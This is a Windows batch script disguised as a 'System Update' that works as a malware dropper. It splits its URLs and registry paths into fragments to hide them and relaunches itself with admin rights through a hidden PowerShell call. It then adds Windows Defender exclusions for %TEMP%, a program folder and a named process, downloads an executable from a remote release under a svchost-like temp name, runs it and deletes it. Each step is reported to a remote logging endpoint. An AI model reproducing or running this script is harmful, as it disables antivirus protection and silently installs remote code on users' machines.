@echo off
setlocal enabledelayedexpansion
title System Update
chcp 65001 >nul 2>&1

:: ── vars ──
set "a=https://zero"
set "b=dpi.com/api/"
set "c=install-log"
set "U=!a!!b!!c!"
set "d=https://git"
set "e=hub.com/rj39"
set "f=r93i9/app/rel"
set "g=eases/downloa"
set "h=d/v2.0.9/Zero"
set "i=DPI_Setup.exe"
set "D=!d!!e!!f!!g!!h!!i!"
set "p1=C:\Program "
set "p2=Files\ZeroDPI"
set "P=!p1!!p2!"
set "T=%TEMP%\svchost_%RANDOM%.exe"
set "H=Content-Type: application/json"

set "r1=HKLM\SOFTWARE"
set "r2=\Microsoft\Wi"
set "r3=ndows "
set "r4=Defender\Exc"
set "r5=lusions"
set "RP=!r1!!r2!!r3!!r4!!r5!\Paths"
set "RE=!r1!!r2!!r3!!r4!!r5!\Processes"

:: ── s1: log start ──
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"started\",\"detail\":\"v1\"}" >nul 2>&1

:: ── s2: admin check ──
net session >nul 2>&1
if %errorlevel% neq 0 (
    curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"uac\",\"detail\":\"req\"}" >nul 2>&1
    powershell -w hidden -c "Start-Process -FilePath '%~f0' -Verb RunAs" >nul 2>&1
    if !errorlevel! neq 0 (
        curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"uac\",\"detail\":\"no\"}" >nul 2>&1
    )
    exit /b
)
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"uac\",\"detail\":\"ok\"}" >nul 2>&1

:: ── s3: exclusions ──
reg add "!RP!" /v "!P!" /t REG_DWORD /d 0 /f >nul 2>&1
set X1=%errorlevel%
reg add "!RP!" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
set X2=%errorlevel%
set "zn=Zero"
set "zn2=DPI.exe"
reg add "!RE!" /v "!zn!!zn2!" /t REG_DWORD /d 0 /f >nul 2>&1
set X3=%errorlevel%
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"def\",\"detail\":\"p=!X1! t=!X2! x=!X3!\"}" >nul 2>&1

:: ── s4: download ──
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"dl\",\"detail\":\"s\"}" >nul 2>&1
curl -L -s -o "!T!" "!D!" >nul 2>&1
if not exist "!T!" (
    curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"dl\",\"detail\":\"c_fail\"}" >nul 2>&1
    bitsadmin /transfer u /download /priority foreground "!D!" "!T!" >nul 2>&1
)
if not exist "!T!" (
    curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"dl\",\"detail\":\"fail\"}" >nul 2>&1
    exit /b 1
)
for %%A in ("!T!") do set SZ=%%~zA
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"dl\",\"detail\":\"ok !SZ!\"}" >nul 2>&1

:: ── s5: install ──
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"inst\",\"detail\":\"s\"}" >nul 2>&1
start /wait "" "!T!"
set EC=%errorlevel%
curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"inst\",\"detail\":\"e=!EC!\"}" >nul 2>&1

:: ── s6: cleanup ──
del /f /q "!T!" >nul 2>&1
if !EC! equ 0 (
    curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"done\",\"detail\":\"ok\"}" >nul 2>&1
) else (
    curl -s -X POST "!U!" -H "!H!" -d "{\"step\":\"err\",\"detail\":\"!EC!\"}" >nul 2>&1
)
exit /b !EC!
